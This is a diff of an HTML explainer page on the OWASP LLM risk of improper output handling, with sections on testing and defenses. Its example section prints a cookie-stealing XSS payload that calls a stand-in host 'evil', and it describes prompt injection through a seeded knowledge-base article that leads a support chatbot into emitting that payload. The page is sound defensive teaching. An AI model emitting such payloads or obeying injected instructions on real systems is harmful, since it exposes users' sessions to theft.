@@ -8,6 +8,7 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
 <link rel="stylesheet" href="paper.css" />
+<script>try{var m=localStorage.getItem('aitools-mode')||localStorage.getItem('llm-judges-mode');if(m==='tech'||m==='eli5')document.documentElement.setAttribute('data-'+m,'on')}catch(e){}</script>
 </head>
 <body>
 <header class="bar"><div class="bar-in">
@@ -33,9 +34,9 @@
     <li><strong>Path traversal &amp; privilege escalation</strong> — unsanitized file paths and over-broad backend permissions exercised via the output.</li>
   </ul>
   <h2 id="what-it-looks-like">What it looks like</h2>
-  <p>A support chatbot renders model replies as Markdown. An attacker seeds a knowledge-base article (or sends a message) that steers the model into returning <code>&lt;img src=x onerror=fetch('//evil/'+document.cookie)&gt;</code>. The frontend renders it raw → <strong>stored XSS</strong> firing in every agent's session. Same root cause, different sinks: "delete all tables" echoed into an unparameterized query, or a hallucinated package name that ships malware into a build.</p>
+  <p>A support chatbot renders model replies as Markdown. An attacker seeds a knowledge-base article (or sends a message) that steers the model into returning <code>&lt;img src=x onerror=fetch('//evil/'+document.cookie)&gt;</code>. The frontend renders it raw → <strong>stored XSS</strong> firing in every agent's session. Same root cause, different sinks: "delete all tables" echoed into an unparameterized query, or a <span class="term" data-term="hallucination">hallucinated</span> package name that ships malware into a build.</p>
   <h2 id="how-to-test-for-it">How to test for it</h2>
-  <p>Treat the model as an injection oracle and drive standard appsec payloads <em>through</em> it. Prompt it to emit <code>&lt;script&gt;</code> / <code>onerror=</code> handlers and watch whether the UI executes them; coax SQL meta-characters or stacked queries into any DB-bound output; request URLs and file paths to probe SSRF and traversal sinks; chain with prompt injection (LLM01) so the trigger comes from data, not the user. The bug is in the <strong>sink</strong> — confirm the rendered/executed result, not just the model text.</p>
+  <p>Treat the model as an injection oracle and drive standard appsec payloads <em>through</em> it. Prompt it to emit <code>&lt;script&gt;</code> / <code>onerror=</code> handlers and watch whether the UI executes them; coax SQL meta-characters or stacked queries into any DB-bound output; request URLs and file paths to probe SSRF and traversal sinks; chain with <span class="term" data-term="prompt-injection">prompt injection</span> (LLM01) so the trigger comes from data, not the user. The bug is in the <strong>sink</strong> — confirm the rendered/executed result, not just the model text.</p>
   <h2 id="defenses">Defenses</h2>
   <p>Adopt a <strong>zero-trust posture toward model output</strong>: validate and sanitize it exactly as you would untrusted user input.</p>
   <ul>
@@ -44,8 +45,14 @@
     <li><strong>Content Security Policy</strong> to blunt XSS; follow OWASP ASVS input-handling guidance.</li>
     <li><strong>Least privilege</strong> on backends the model can reach, plus logging and anomaly detection on output-driven actions.</li>
   </ul>
+
+  <section id="definitions">
+    <h2>Definitions</h2>
+    <div data-terms-list></div>
+  </section>
 </main>
 <footer>Part of the <a href="../index.html">Red Teaming ramp-up map</a> · OWASP LLM Top 10 (2025) · verify against the current OWASP text.</footer>
+<script src="https://idvorkin-ai-tools.github.io/assets/terms.js" defer></script>
 <!-- Private comments mode, inert unless ?annotate=1 (see assets/annotate.js in idvorkin-ai-tools.github.io) -->
 <script src="https://idvorkin-ai-tools.github.io/assets/annotate.js" data-branch="add-red-teaming-explainer" defer></script>
 </body>
